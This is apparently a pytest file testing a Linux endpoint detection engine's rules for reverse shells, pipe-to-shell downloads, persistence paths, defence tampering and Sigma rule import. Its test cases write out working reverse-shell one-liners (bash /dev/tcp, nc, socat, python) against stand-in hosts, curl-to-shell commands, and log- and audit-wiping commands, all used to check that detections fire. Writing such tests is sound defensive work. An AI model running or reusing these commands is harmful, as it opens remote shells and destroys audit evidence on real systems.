"""The Linux rules in isolation, and proof that the two operating systems' rules stay out of each other's way."""

from __future__ import annotations

import pytest
from sentinel_detect import Engine, StreamBuilder, SuppressionList, default_corpus
from sentinel_detect.sigma import SigmaUnsupported, load_sigma_rules, parse_sigma_rule

BASH = "/usr/bin/bash"
SH = "/usr/bin/dash"


def run(events):
    return Engine(suppressions=SuppressionList([])).feed_stream(events)


def ids(detections):
    return {d.rule_id for d in detections}


def spawn(image: str, command_line: str, parent: str = BASH):
    b = StreamBuilder(host="pi5")
    b.process_create("P", image, parent_guid="S", parent_image=parent, command_line=command_line)
    return run(b.events)


@pytest.mark.parametrize("cmd", [
    "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
    "sh -c 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 198.51.100.7 4444 > /tmp/f'",
    "nc -e /bin/sh 198.51.100.7 4444",
    "socat tcp:198.51.100.7:4444 exec:/bin/sh,pty,stderr",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"h\",1));os.dup2(s.fileno(),0)'",
    "sh -c 'echo YmFzaCAtaQ== | base64 -d | sh'",
])
def test_reverse_shells_fire_with_high_confidence(cmd):
    out = spawn(BASH, cmd)
    assert "linux.exec.remote_shell" in ids(out)
    assert next(d for d in out if d.rule_id == "linux.exec.remote_shell").confidence == "high"


@pytest.mark.parametrize("cmd", [
    "sh -c 'curl -fsSL http://h.invalid/i.sh | sh'", "bash -c 'wget -qO- https://h.invalid/x | sudo bash'",
])
def test_pipe_to_shell_fires(cmd):
    out = spawn(SH, cmd)
    assert ids(out) == {"linux.exec.remote_shell"} and "T1105" in out[0].technique_ids


@pytest.mark.parametrize(("image", "cmd"), [
    ("/usr/bin/curl", "curl -fsSL https://h.invalid/i.sh -o i.sh"), ("/usr/bin/nc", "nc -zv 10.0.0.5 22"),
    ("/usr/bin/nc", "nc -l 8080"), (BASH, "bash -c 'curl https://h.invalid/a.json | jq .'"),
    ("/usr/bin/python3", "python3 -m http.server"), ("/usr/bin/base64", "base64 -d file.b64"),
])
def test_ordinary_network_tools_are_quiet(image, cmd):
    assert spawn(image, cmd) == []


def test_exec_from_temporary_folders_only():
    for path in ("/tmp/a", "/var/tmp/x/y", "/dev/shm/z"):
        assert ids(spawn(path, path)) == {"linux.exec.from_tmp"}
    for path in ("/usr/bin/tmp", "/home/sam/tmp/a", "/opt/tmp/a", "/tmpfoo/a"):
        assert spawn(path, path) == []


def test_web_server_shell_needs_a_web_server_parent_and_a_shell_child():
    assert ids(spawn(SH, "sh -c id", parent="/usr/sbin/apache2")) == {"linux.exec.web_server_shell"}
    assert ids(spawn(BASH, "bash -c whoami", parent="/usr/sbin/php-fpm")) == {"linux.exec.web_server_shell"}
    assert spawn("/usr/bin/convert", "convert a.png b.jpg", parent="/usr/sbin/php-fpm") == []  # not a shell
    assert spawn(SH, "sh -c 'logrotate x'", parent="/usr/sbin/cron") == []  # not a web server
    assert spawn(SH, "sh -c 'npm run build'", parent="/usr/bin/node") == []  # general-purpose runtime


@pytest.mark.parametrize(("path", "technique"), [
    ("/etc/cron.d/x", "T1053.003"), ("/var/spool/cron/crontabs/root", "T1053.003"), ("/etc/crontab", "T1053.003"),
    ("/etc/systemd/system/x.service", "T1543.002"), ("/home/sam/.config/systemd/user/x.service", "T1543.002"),
    ("/home/sam/.ssh/authorized_keys", "T1098.004"), ("/etc/ld.so.preload", "T1574.006"),
    ("/etc/rc.local", "T1037.004"), ("/etc/profile.d/x.sh", "T1037.004"),
])
def test_persistence_locations_fire_with_their_technique(path, technique):
    b = StreamBuilder()
    b.file_write("S", path, image=BASH)
    out = run(b.events)
    assert ids(out) == {"linux.persist.startup_location"} and out[0].technique_ids == [technique]


@pytest.mark.parametrize(("path", "image"), [
    ("/etc/cron.d/certbot", "/usr/bin/dpkg"), ("/usr/lib/systemd/system/x.service", "/usr/bin/apt-get"),
    ("/etc/systemd/system/x.service.d/override.conf", "/usr/bin/vim"),  # a drop-in, not a unit
    ("/home/sam/.ssh/known_hosts", "/usr/bin/ssh"), ("/etc/cron.d.bak/x", BASH), ("/home/sam/cron.d/x", BASH),
    ("/etc/systemd/system.conf", BASH),
])
def test_package_managers_and_neighbouring_paths_are_quiet(path, image):
    b = StreamBuilder()
    b.file_write("S", path, image=image)
    assert run(b.events) == []


@pytest.mark.parametrize(("image", "cmd", "technique"), [
    ("/usr/sbin/auditctl", "auditctl -e 0", "T1562.001"), ("/usr/sbin/auditctl", "auditctl -D", "T1562.001"),
    ("/usr/bin/systemctl", "systemctl stop auditd", "T1562.001"),
    ("/usr/bin/systemctl", "systemctl disable --now ufw", "T1562.001"),
    ("/usr/sbin/ufw", "ufw disable", "T1562.004"), ("/usr/sbin/iptables", "iptables -F", "T1562.004"),
    ("/usr/sbin/setenforce", "setenforce 0", "T1562.001"),
    (BASH, "bash -c 'history -c && unset HISTFILE'", "T1070.003"),
    ("/usr/bin/rm", "rm -f /home/sam/.bash_history", "T1070.003"),
    ("/usr/bin/shred", "shred -u /var/log/auth.log", "T1070.002"),
    ("/usr/bin/journalctl", "journalctl --vacuum-time=1s", "T1070.002"),
    (BASH, "bash -c 'rm -rf /var/log/audit/ ; ufw disable'", "T1562.004"),  # one detection per command
])
def test_defence_tampering_fires(image, cmd, technique):
    out = spawn(image, cmd)
    assert [d.rule_id for d in out] == ["linux.defense.tamper"] and out[0].technique_ids == [technique]


@pytest.mark.parametrize(("image", "cmd"), [
    ("/usr/sbin/auditctl", "auditctl -l"), ("/usr/sbin/auditctl", "auditctl -e 1"),
    ("/usr/bin/systemctl", "systemctl restart auditd"), ("/usr/bin/systemctl", "systemctl stop nginx"),
    ("/usr/sbin/ufw", "ufw status"), ("/usr/sbin/iptables", "iptables -L -n"),
    ("/usr/bin/git", "git commit -m 'history -c fix; ufw disable docs'"),  # the words, inside another program
    ("/usr/bin/grep", "grep -r 'auditctl -e 0' /etc"), ("/usr/bin/cat", "cat /home/sam/.bash_history"),
    ("/usr/bin/tail", "tail -f /var/log/auth.log"), ("/usr/bin/journalctl", "journalctl --vacuum-time=30d"),
    ("/usr/bin/rm", "rm -f /var/log/myapp/debug.log"),
])
def test_looking_and_ordinary_maintenance_are_quiet(image, cmd):
    assert spawn(image, cmd) == []


def test_windows_and_linux_rules_do_not_cross_fire():
    for scenario in default_corpus():
        fired = ids(Engine().feed_stream(scenario.events))
        linux_scenario = scenario.name.startswith("linux_")
        assert all(r.startswith("linux.") == linux_scenario for r in fired), (scenario.name, fired)


# ---------------------------------------------------------------- Sigma by product

LINUX_RULE = {
    "title": "Linux reverse shell", "id": "bbbbbbbb-0000-0000-0000-000000000001", "level": "high",
    "logsource": {"product": "linux", "category": "process_creation"},
    "detection": {"selection": {"Image|endswith": "/bash", "CommandLine|contains": "/dev/tcp/"}, "condition": "selection"},
}


def test_sigma_imports_one_product_at_a_time(tmp_path):
    import yaml

    (tmp_path / "linux.yml").write_text(yaml.safe_dump(LINUX_RULE), encoding="utf-8")
    windows = {**LINUX_RULE, "id": "bbbbbbbb-0000-0000-0000-000000000002", "logsource": {"product": "windows",
                                                                                      "category": "process_creation"}}
    (tmp_path / "windows.yml").write_text(yaml.safe_dump(windows), encoding="utf-8")
    auditd = {**LINUX_RULE, "id": "bbbbbbbb-0000-0000-0000-000000000003", "logsource": {"product": "linux",
                                                                                     "service": "auditd"}}
    (tmp_path / "auditd.yml").write_text(yaml.safe_dump(auditd), encoding="utf-8")

    as_linux = load_sigma_rules([tmp_path], product="linux")
    assert [r.rule_id for r in as_linux.rules] == ["sigma.bbbbbbbb-0000-0000-0000-000000000001"]
    reasons = sorted(reason for _, reason in as_linux.skipped)
    assert reasons == ["log source service 'auditd' is not collected", "product 'windows' is not collected"]
    as_windows = load_sigma_rules([tmp_path])
    assert [r.rule_id for r in as_windows.rules] == ["sigma.bbbbbbbb-0000-0000-0000-000000000002"]

    rule = parse_sigma_rule(LINUX_RULE, product="linux")
    b = StreamBuilder()
    event = b.process_create("P", BASH, command_line="bash -i >& /dev/tcp/1.2.3.4/9 0>&1")
    from sentinel_detect.process_tree import ProcessTree
    assert rule.matches(event, ProcessTree())
    with pytest.raises(SigmaUnsupported, match="not collected"):
        parse_sigma_rule({**LINUX_RULE, "logsource": {"product": "linux", "category": "registry_set"}}, product="linux")
